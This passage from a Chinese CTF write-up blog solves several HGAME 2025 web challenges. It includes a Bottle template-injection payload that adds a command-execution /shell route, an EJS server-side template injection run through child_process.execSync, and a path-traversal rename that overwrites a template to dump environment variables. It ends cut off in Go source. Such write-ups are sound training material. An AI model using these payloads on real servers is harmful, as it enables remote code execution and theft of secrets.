class="token operator">%</span>252Fx<span class="token operator">-</span>www<span class="token operator">-</span><span class="token keyword">for</span> m<span class="token operator">-</span>urlencoded<span class="token operator">%</span>250AContent<span class="token operator">-</span>Length<span class="token operator">%</span>253A7<span class="token operator">%</span>250A<span class="token operator">%</span>250Acmd<span class="token operator">%</span>253Denv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://blog.csdn.net/wan212000/article/details/128830035">127.0.0.1 与 127.0.0.2 这两个 IP 地址的区别-CSDN博客</a></p><p><a href="https://blog.csdn.net/2201_76032266/article/details/142872238">0.0.0.0详解_0.0.0.0是什么ip地址-CSDN博客</a></p><hr><h3 id="Message-in-a-Bottle-plus"><a href="#Message-in-a-Bottle-plus" class="headerlink" title="Message in a Bottle plus"></a>Message in a Bottle plus</h3><blockquote><p>在python⾥%print这本身就是⼀个错误的语法，为了让他可以通过语法检测 然⽽语法检测这种东⻄肯定针对的是代码，那么我们将他变成字符串就可以了，⽤引号包裹就可以绕过ast的检测 </p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">'''% from bottle import Bottle, request% app=__import__('sys').modules['__main__'].__dict__['app']% app.route("/shell","GET",lambda :__import__('os').popen(request.params.get('lalala')).read())'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>建议用burp发</p><hr>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame</title>
      <link href="/2025/02/25/qqqqq-000380-week1-wp/"/>
      <url>/2025/02/25/qqqqq-000380-week1-wp/</url>
      
        <content type="html"><![CDATA[<p>qqqqq#000380-week1-wp</p><p><a href="https://xz.aliyun.com/news/16776">文章 - hgame2025 第一周 web wp - 先知社区</a></p><p><a href="https://eddiemurphy89.github.io/2025/02/04/HGAME2025-WEB/#Level-25-%E5%8F%8C%E9%9D%A2%E4%BA%BA%E6%B4%BE%E5%AF%B9">HGAME2025-WEB - EddieMurphy’s blog</a></p><h3 id="Level-24-Pacman"><a href="#Level-24-Pacman" class="headerlink" title="Level 24 Pacman"></a><strong>Level 24 Pacman</strong></h3><p>先玩一局</p><pre class="line-numbers language-none"><code class="language-none">aGFlcGFpZW1rc3ByZXRnbXtydGNfYWVfZWZjfQ==haepaiemkspretgm{rtc_ae_efc}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><del>喜得278分</del></p><p>得100000分，寻找score</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/34bcb5e5354ea11caeb908bd02f4e43b.png"></p><p>在控制台改</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/878446aa7b560453f2d8aaec91eab56c.png"></p><p><del>作为cheater,美美通关</del></p><p><code>haeu4epca_4trgm{_r_amnmse}</code></p><p>与上一个对比一下（</p><p><code>haepaiemkspretgm{rtc_ae_efc}</code></p><p>必须要凑出来一个hgame{ }的形式，然后观察大括号前的字符串，发现他们前三个字母跟后两个字母都是一样的，然后正好能凑出hgame，于是隔一插一</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/4f358ee9302e40c4c3d06a7cde1ca2bc.png"></p><p>看来思路是对的（所以为了凑整齐把practice写成pratice吗。。。<del>出题人你这家伙</del></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/2a7b405e49d62ba1b302f97da1a4dcaa.png"></p><hr><p>后来才知道</p><p>好好好，这原来是栅栏密码吗，不造呀（</p><hr><h3 id="Level-47-BandBomb"><a href="#Level-47-BandBomb" class="headerlink" title="Level 47 BandBomb"></a>Level 47 BandBomb</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> multer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'multer'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//express：一个流行的 Node.js Web 应用框架，用于创建服务器和处理路由。</span><span class="token comment">//multer：一个用于处理 multipart/form-data 类型的表单数据，主要用于文件上传的中间件。</span><span class="token comment">//fs：Node.js 的文件系统模块，用于对文件和目录进行读写、创建、删除等操作。</span><span class="token comment">//path：Node.js 的路径处理模块，用于处理和转换文件路径。</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//通过调用 express() 函数创建一个 Express 应用实例，后续将使用该实例来配置路由、中间件等。</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将 EJS（Embedded JavaScript）设置为 Express 应用的视图引擎，这样可以使用 EJS 模板来渲染动态网页。</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/static'</span><span class="token punctuation">,</span> express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//app.use('/static', express.static(path.join(__dirname, 'public')))：将 public 目录下的文件作为静态文件提供服务，通过 /static 前缀访问。例如，public 目录下的 image.jpg 文件可以通过 /static/image.jpg 访问。</span><span class="token comment">//app.use(express.json())：使用 express.json() 中间件来解析客户端发送的 JSON 格式的数据，将其转换为 JavaScript 对象并挂载到 req.body 上。所以这里直接传参json格式的数据即可</span><span class="token keyword">const</span> storage <span class="token operator">=</span> multer<span class="token punctuation">.</span><span class="token function">diskStorage</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  <span class="token function-variable function">destination</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> file<span class="token punctuation">,</span> cb</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> uploadDir <span class="token operator">=</span> <span class="token string">'uploads'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>uploadDir<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      fs<span class="token punctuation">.</span><span class="token function">mkdirSync</span><span class="token punctuation">(</span>uploadDir<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> uploadDir<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token function-variable function">filename</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> file<span class="token punctuation">,</span> cb</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> file<span class="token punctuation">.</span>originalname<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//multer.diskStorage：用于配置文件存储的磁盘存储引擎。</span>destination：一个回调函数，用于指定文件存储的目录。如果 uploads 目录不存在，则使用 fs<span class="token punctuation">.</span>mkdirSync 创建该目录。filename：一个回调函数，用于指定文件存储的文件名，这里直接使用文件的原始文件名。<span class="token keyword">const</span> upload <span class="token operator">=</span> <span class="token function">multer</span><span class="token punctuation">(</span><span class="token punctuation">{</span>   <span class="token literal-property property">storage</span><span class="token operator">:</span> storage<span class="token punctuation">,</span>  <span class="token function-variable function">fileFilter</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">_<span class="token punctuation">,</span> file<span class="token punctuation">,</span> cb</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>file<span class="token punctuation">.</span>originalname<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'无效的文件名'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'文件处理错误'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//multer：创建一个 multer 实例，使用之前配置的存储引擎 storage。</span><span class="token comment">//fileFilter：一个回调函数，用于过滤上传的文件。如果文件名不存在，则返回一个错误并拒绝上传；否则允许上传。</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> uploadsDir <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>uploadsDir<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    fs<span class="token punctuation">.</span><span class="token function">mkdirSync</span><span class="token punctuation">(</span>uploadsDir<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  fs<span class="token punctuation">.</span><span class="token function">readdir</span><span class="token punctuation">(</span>uploadsDir<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> files</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'mortis'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">files</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//漏洞</span>    <span class="token punctuation">}</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'mortis'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">files</span><span class="token operator">:</span> files <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//app.get('/', ...)：处理根路径 / 的 GET 请求。</span><span class="token comment">//首先检查 uploads 目录是否存在，如果不存在则创建该目录。</span><span class="token comment">//使用 fs.readdir 读取 uploads 目录下的所有文件和文件夹名称。</span><span class="token comment">//如果读取过程中出现错误，返回 500 状态码并渲染 mortis 模板，传递一个空的文件列表。</span><span class="token comment">//如果读取成功，渲染 mortis 模板并传递文件列表。</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>  upload<span class="token punctuation">.</span><span class="token function">single</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">error</span><span class="token operator">:</span> err<span class="token punctuation">.</span>message <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>file<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">'没有选择文件'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>       <span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">'文件上传成功'</span><span class="token punctuation">,</span>      <span class="token literal-property property">filename</span><span class="token operator">:</span> req<span class="token punctuation">.</span>file<span class="token punctuation">.</span>filename     <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//app.post('/upload', ...)：处理 /upload 路径的 POST 请求。</span><span class="token comment">//upload.single('file')：使用 multer 中间件处理单个文件上传，表单中文件字段的名称为 file。</span><span class="token comment">//如果上传过程中出现错误，返回 400 状态码并以 JSON 格式返回错误信息。</span><span class="token comment">//如果没有选择文件，返回 400 状态码并以 JSON 格式返回错误信息。</span><span class="token comment">//如果上传成功，以 JSON 格式返回成功信息和上传文件的文件名。</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/rename'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token punctuation">{</span> oldName<span class="token punctuation">,</span> newName <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>  <span class="token keyword">const</span> oldPath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">,</span> oldName<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> newPath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">,</span> newName<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>oldName <span class="token operator">||</span> <span class="token operator">!</span>newName<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">' '</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  fs<span class="token punctuation">.</span><span class="token function">rename</span><span class="token punctuation">(</span>oldPath<span class="token punctuation">,</span> newPath<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">' '</span> <span class="token operator">+</span> err<span class="token punctuation">.</span>message <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">' '</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//app.post('/rename', ...)：处理 /rename 路径的 POST 请求。</span><span class="token comment">//从请求体中获取旧文件名 oldName 和新文件名 newName。</span><span class="token comment">//构建旧文件和新文件的完整路径。</span><span class="token comment">//如果旧文件名或新文件名不存在，返回 400 状态码并以 JSON 格式返回错误信息（此处错误信息为空，应补充完整）。</span><span class="token comment">//使用 fs.rename 对文件进行重命名操作。</span><span class="token comment">//如果重命名过程中出现错误，返回 500 状态码并以 JSON 格式返回错误信息（此处错误信息为空，应补充完整）。</span><span class="token comment">//如果重命名成功，以 JSON 格式返回成功信息。</span>         app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">服务器运行在 http://localhost:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>port<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调用 app.listen 方法启动服务器，监听指定的端口 port。服务器启动后，在控制台输出服务器的运行地址。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://xz.aliyun.com/news/11769">文章 - Ejs模板引擎注入实现RCE - 先知社区</a></p><p><a href="https://www.cnblogs.com/hackerone/p/17216027.html">hxp ctf valentine ejs ssti 语法特性造成的漏洞 - Galio - 博客园</a></p><blockquote><p>在render()函数渲染的mortis是一个自定义的前端模板文件，一般会命名为mortis.ejs文件，这里通过渲染这个摹本文件时实现在前端，后面的files就是上传的文件名</p><p>一般EJS模板文件是存放在项目的views目录下，这是Express框架的默认约定，用于存在模板文件，就像flask框架中的是将html模板文件放在templates目录下。主要作用代码如下：</p><p>app.set(‘view engine’, ‘ejs’);</p><p>这个就代表使用默认情况。</p></blockquote><p>1. </p><pre class="line-numbers language-none"><code class="language-none">&lt;%= global.process.mainModule.require('child_process').execSync("env &gt; /app/public/text.txt") %&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><code>global.process.mainModule.require('child_process')</code> 这行代码的主要目的是在 Node.js 环境里引入 <code>child_process</code> 模块。</p><p>在 Node.js 里，<code>global</code> 是一个全局对象，类似于浏览器环境中的 <code>window</code> 对象。它可以让你在全局作用域下访问各种全局变量和函数。</p><p><code>process</code> 是 <code>global</code> 对象下的一个属性，它代表当前 Node.js 进程。<code>process</code> 对象提供了许多与进程相关的信息和方法，像进程的环境变量、命令行参数、标准输入输出等。</p><p><code>process.mainModule</code> 指向 Node.js 应用的主模块，也就是启动应用时执行的那个文件所对应的模块。通过 <code>mainModule</code> 可以获取主模块的一些信息，例如模块的文件名、路径等。</p><p><code>require</code> 是 Node.js 用于引入模块的函数。<code>'child_process'</code> 是 Node.js 的一个内置模块，<code>child_process</code> 模块允许你创建子进程，从而在 Node.js 应用中执行外部命令或者脚本。引入这个模块后，你就可以使用它提供的各种方法，像 <code>spawn</code>、<code>exec</code>、<code>execSync</code> 等。</p><ol><li>env 命令<br>env 是一个用于显示当前环境变量的命令。环境变量是操作系统中存储的一些值，它们可以影响系统和应用程序的行为。例如，PATH 环境变量定义了系统查找可执行文件的路径，HOME 环境变量表示当前用户的主目录。当你在终端中输入 env 并执行时，会列出当前环境中所有的环境变量及其对应的值。</li><li>重定向符号<br>在 Unix 系统的命令行中，&gt; 是重定向符号，它的作用是将命令的输出结果重定向到指定的文件中。如果文件不存在，会创建该文件；如果文件已经存在，会覆盖原文件的内容。</li><li>/app/public/text.txt<br>这是指定的输出文件路径。命令会将 env 命令输出的环境变量信息写入到 /app/public/text.txt 文件中。(即static下)</li></ol></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/26ca8dcec71d8a6ba88360fe838a2ae6.png"></p><ol><li><strong>上传恶意文件</strong>：先上传一个恶意的 EJS 模板文件，例如包含恶意代码的 <code>text.txt</code>。</li><li><strong>构造路径穿越文件名</strong>：构造特殊的新文件名，利用路径穿越字符（如 <code>../</code>）来突破 <code>uploads</code> 目录的限制。例如，将新文件名设置为 <code>../views/mortis.ejs</code>，这样就可以尝试将上传的 <code>text.txt</code> 文件重命名并覆盖掉原本的 <code>mortis.ejs</code> 模板文件。</li><li><strong>发送重命名请求</strong>：攻击者向 <code>/rename</code> 接口发送 POST 请求，请求体包含旧文件名（上传的恶意文件的文件名）和构造好的新文件名。示例请求如下：</li></ol><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"oldName"</span><span class="token operator">:</span> <span class="token string">"text.txt"</span><span class="token punctuation">,</span>    <span class="token property">"newName"</span><span class="token operator">:</span> <span class="token string">"../views/mortis.ejs"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如果应用程序没有对文件名进行严格验证，<code>fs.rename</code> 函数就会尝试将 <code>uploads</code> 目录下的 <code>malicious.ejs</code> 文件移动并重命名为 <code>views</code> 目录下的 <code>mortis.ejs</code>，从而实现对 EJS 模板文件的覆盖，然后就啦啦啦了（</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/fb82e461c16f49f61efd9b2196e554ea.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/e2e991d6c0e450b3f2dc1188a8916e49.png"></p><hr><h3 id="Level-69-MysteryMessageBoard"><a href="#Level-69-MysteryMessageBoard" class="headerlink" title="Level 69 MysteryMessageBoard"></a>Level 69 MysteryMessageBoard</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"context"</span><span class="token string">"fmt"</span><span class="token string">"github.com/chromedp/chromedp"</span><span class="token string">"github.com/gin-gonic/gin"</span><span class="token string">"github.com/gorilla/sessions"</span><span class="token string">"log"</span><span class="token string">"net/http"</span><span class="token string">"sync"</span><span class="token string">"time"</span><span class="token punctuation">)</span><span class="token keyword">var</span> <span class="token punctuation">(</span>store <span class="token operator">=</span> sessions<span class="token punctuation">.</span><span class="token function">NewCookieStore</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"fake_key"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>users <span class="token operator">=</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span><span class="token string">"shallot"</span><span class="token punctuation">:</span> <span class="token string">"fake_password"</span><span class="token punctuation">,</span><span class="token comment">//shallot 代表了系统中的一个用户</span><span class="token string">"admin"</span><span class="token punctuation">:</span>   <span class="token string">"fake_password"</span><span class="token punctuation">}</span>comments <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span>flag     <span class="token operator">=</span> <span class="token string">"FLAG{this_is_a_fake_flag}"</span>lock     sync<span class="token punctuation">.</span>Mutex<span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">loginHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//c *gin.Context 是 gin 框架中的上下文对象，包含了请求和响应的相关信息。</span>username <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">PostForm</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span>password <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">PostForm</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token keyword">if</span> storedPassword<span class="token punctuation">,</span> ok <span class="token operator">:=</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">;</span> ok <span class="token operator">&amp;&amp;</span> storedPassword <span class="token operator">==</span> password <span class="token punctuation">{</span>session<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> store<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>Request<span class="token punctuation">,</span> <span class="token string">"session"</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>Values<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> usernamesession<span class="token punctuation">.</span>Options <span class="token operator">=</span> <span class="token operator">&amp;</span>sessions<span class="token punctuation">.</span>Options<span class="token punctuation">{</span>Path<span class="token punctuation">:</span>     <span class="token string">"/"</span><span class="token punctuation">,</span>MaxAge<span class="token punctuation">:</span>   <span class="token number">3600</span><span class="token punctuation">,</span>HttpOnly<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>Secure<span class="token punctuation">:</span>   <span class="token boolean">false</span><span class="token punctuation">,</span><span class="token punctuation">}</span>session<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>Request<span class="token punctuation">,</span> c<span class="token punctuation">.</span>Writer<span class="token punctuation">)</span>c<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span>http<span 